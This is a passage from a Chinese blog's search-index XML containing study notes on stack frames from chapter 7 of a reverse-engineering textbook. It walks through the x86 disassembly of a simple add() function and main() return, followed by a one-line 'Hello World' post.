图7-8所示，而[EBP-8]与[EBP-4]则分别指向add()函数的2个局部变量x、y。执行完上述语句后，栈内情况如下图所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205193428211.png" alt="image-20211205193428211"></p><h2 id="7-2-7-ADD-运算"><a href="#7-2-7-ADD-运算" class="headerlink" title="7.2.7 ADD 运算"></a>7.2.7 ADD 运算</h2><p>StackFrame.cpp源代码中，下面这条语句用于返回2个局部变量之和。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">return</span> (x + y);<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401092    | 8B45 FC             | mov eax,dword ptr ss:[ebp-4]            |;[ebp-4]= local x<br></code></pre></td></tr></table></figure><p>上述MOV语句中，变量x的值被传送到EAX。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401095    | 0345 F8             | add eax,dword ptr ss:[ebp-8]            |;[ebp-8]= local y<br></code></pre></td></tr></table></figure><p>ADD指令为加法指令，上面这条语句中，变量y （[EBP-8] &#x3D; 2 ）与EAX原值（x）相加，且运 算结果被存储在EAX中，运算完成后EAX中的值为3。 第14章中我们将详细学习EAX寄存器，它是一种通用寄存器，在算术运算中存储输入输岀数据，为函数提供返回值。如上所示，函数即将返回时，若向EAX输入某个值，该值就会原封不动地返回。执行运算的过程中栈内情况保持不变。</p><h2 id="7-2-8删除函数add-的栈帧-amp-函数执行完毕（返回）"><a href="#7-2-8删除函数add-的栈帧-amp-函数执行完毕（返回）" class="headerlink" title="7.2.8删除函数add()的栈帧&amp;函数执行完毕（返回）"></a>7.2.8删除函数add()的栈帧&amp;函数执行完毕（返回）</h2><p>“删除函数栈帧与函数执行完毕返回”对应于StackFrame.cpp文件中的如下代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">return</span> (x + y); &#125;<br></code></pre></td></tr></table></figure><p>执行完加法运算后，要返回函数add()，在此之前先删除函数add()的栈帧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401098    | 8BE5                | mov esp,ebp                             |<br></code></pre></td></tr></table></figure><p>上面这条命令把当前EBP的值赋给ESP,与地址00401081处的MOV EBP, ESP命令相对应。在地址00401081处，MOV EBP, ESP命令把函数add()开始执行时的ESP值（12FF44）放入EBP，函数执行完毕时，使用00401098处的MOV ESP,EBP命令再把存储到EBP中的值恢复到ESP中。</p><p>执行完上面的命令后，地址00401083处的SUB ESP,8命令就会失效，即函数add()的2个局部变量x、y不再有效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0040109A    | 5D                  | pop ebp                                 |<br></code></pre></td></tr></table></figure><p>上面这条命令用于恢复函数add()开始执行时备份到栈中的EBP值，它与00401080地址处的PUSH EBP命令对应。EBP值恢复为12FF40,它是main()函数的EBP值。到此，add()函数的栈帧就被删除了。</p><p>执行完上述命令后，栈内情形如下图所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205200647612.png" alt="image-20211205200647612"></p><p>可以看到，ESP的值为12FF2C，该地址的值为4010C1，它是执行CALL 401080命令时CPU存储到栈中的返回地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0040109B    | C3                  | ret                                     |<br></code></pre></td></tr></table></figure><p>执行上述RETN命令，存储在栈中的返回地址即被返回，此时栈内情形如图7-11所示。</p><p>从下图中可以看到，调用栈已经完全返回到调用add()函数之前的状态，大家可以比较一下调用前后的两张堆栈图。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205200856191.png" alt="image-20211205200856191"></p><p>应用程序采用上述方式管理栈，不论有多少函数嵌套调用，栈都能得到比较好的维护，不会崩溃。但是由于函数的局部变量、参数、返回地址等是一次性保存到栈中的，利用字符串函数的漏洞等很容易引起栈缓冲区溢出，最终导致程序或系统崩溃。</p><h2 id="7-2-9从栈中删除函数add-的参数（整理栈）"><a href="#7-2-9从栈中删除函数add-的参数（整理栈）" class="headerlink" title="7.2.9从栈中删除函数add()的参数（整理栈）"></a>7.2.9从栈中删除函数add()的参数（整理栈）</h2><p>现在，程序执行流已经重新返回main()函数中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">004010C1    | 83C4 08             | add esp,8                               |<br></code></pre></td></tr></table></figure><p>上面语句使用ADD命令将ESP加上8,为什么突然要把ESP加上8呢？请看图7-11中的栈窗口，地址12FF30与12FF34处存储的是传递给函数add()的参数a与b。函数add()执行完毕后，就不再需要参数a与b了，所以要把ESP加上8,将它们从栈中清理掉（参数a与b都是长整型，各占4个字节，合起来共8个字节）。</p><blockquote><p>请记住，调用add()函数之前先使用PUSH命令把参数a、b压入栈。</p></blockquote><p>执行完上述命令后，栈内情况如下图所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205201305317.png" alt="image-20211205201305317"></p><blockquote><p>被调函数执行完毕后，函数的调用者（Caller）负责清理存储在栈中的参数，这种 方式称为cdecl方式；反之，被调用者（Callee）负责清理保存在栈中的参数，这种方 式称为stdcall方式。这些函数调用规则统称为调用约定（Calling Convention），这在程序开发与分析中是一个非常重要的概念，第10章将进一步讲解相关内容。</p></blockquote><h2 id="7-2-10调用-printf-函数"><a href="#7-2-10调用-printf-函数" class="headerlink" title="7.2.10调用 printf()函数"></a>7.2.10调用 printf()函数</h2><p>StackFrame.cpp源文件中用于打印输出运算结果的语句如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,add(a, b));<br></code></pre></td></tr></table></figure><p>调用printf()函数的汇编代码如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">004010C4    | 50                  | push eax                                |<br>004010C5    | 68 18304000         | push petest01.403018                    | 403018:&quot;%d\n&quot;<br>004010CA    | E8 71FFFFFF         | call petest01.401040                    |<br>004010CF    | 83C4 08             | add esp,8                               |<br></code></pre></td></tr></table></figure><p>地址004010C4处的EAX寄存器中存储着函数add()的返回值，它是执行加法运算后的结果值3。地址004010CA处的CALL 401040命令中调用的是401040地址处的函数，它是一个C标准库函数printf()，所有C标准库函数都由Visual C++编写而成（其中包含着数量庞大的函数，在此不详细介绍）。由于上面的printf()函数有2个参数，大小为8个字节（ 32位寄存器+32位常量&#x3D;64位&#x3D;8字节），所以在40104F地址处使用ADD命令，将ESP加上8个字节，把函数的参数从栈中删除。函数printf()执行完毕并通过ADD命令删除参数后，栈内情形如下图所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205201954369.png" alt="image-20211205201954369"></p><h2 id="7-2-11设置返回值"><a href="#7-2-11设置返回值" class="headerlink" title="7.2.11设置返回值"></a>7.2.11设置返回值</h2><p>StackFrame.cpp中设置返回值的语句如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>main()函数使用该语句设置返回值（0）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">004010D2    | 33C0                | xor eax,eax                             |<br></code></pre></td></tr></table></figure><p>XOR命令用来进行Exclusive OR bit （异或）运算，其特点为 “2个相同的值进行XOR运算，结果为0”。XOR命令比MOV EAX, 0命令执行速度快，常用于寄存器的初始化操作。</p><blockquote><p>利用相同的值连续执行2次XOR运算即变为原值，这个特征被大量应用于编码与解码。后面的代码分析中我们会经常看到XOR命令。</p></blockquote><h2 id="7-2-12删除栈帧-amp-main-函数终止"><a href="#7-2-12删除栈帧-amp-main-函数终止" class="headerlink" title="7.2.12删除栈帧&amp;main()函数终止"></a>7.2.12删除栈帧&amp;main()函数终止</h2><p>本节内容对应StackFrame.cpp中的如下代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终主函数终止执行，同add()函数一样，其返回前要先从栈中删除与其对应的栈帧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">004010D4    | 8BE5                | mov esp,ebp                             |<br>004010D6    | 5D                  | pop ebp                                 |<br></code></pre></td></tr></table></figure><p>执行完上面2条命令后，main()函数的栈帧即被删除，且其局部变量a、b也不再有效。执行至此，栈内情形如下图所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205202236073.png" alt="image-20211205202236073"></p><p>上图与main()函数开始执行时栈内情形是完全一样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">004010D7    | C3                  | ret                                     |<br></code></pre></td></tr></table></figure><p>执行完上面命令后，主函数执行完毕并返回，程序执行流跳转到返回地址处（4012A5），该 地址指向Visual C++的启动函数区域。随后执行进程终止代码。请各位自行查看该过程。请大家阅读上面内容的同时动手调试，认真观察栈的行为动作，相信各位的调试水平会得到很大提高</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第7章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/1111/01/01/hello-world/"/>
    <url>/1111/01/01/hello-world/</url>
    
    <content type="html"><![CDATA[<p>博客初迁移，请多指教！</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
